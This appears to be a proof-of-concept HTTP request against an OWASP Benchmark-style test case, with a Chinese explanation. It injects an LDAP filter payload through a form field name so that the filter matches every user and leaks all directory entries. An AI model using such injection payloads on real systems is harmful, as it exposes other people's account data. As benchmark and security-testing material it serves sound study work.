POST /benchmark/ldapi-00/BenchmarkTest00427 HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

*)(uid=*))=BenchmarkTest00427

解释：字段名为 `*)(uid=*))`，其值 `BenchmarkTest00427` 触发条件；拼接后过滤器变为 `(&(objectclass=person)(uid=*)(uid=*))))`，其中 `(uid=*)` 匹配所有用户，导致 LDAP 搜索结果返回全部条目（信息泄露）。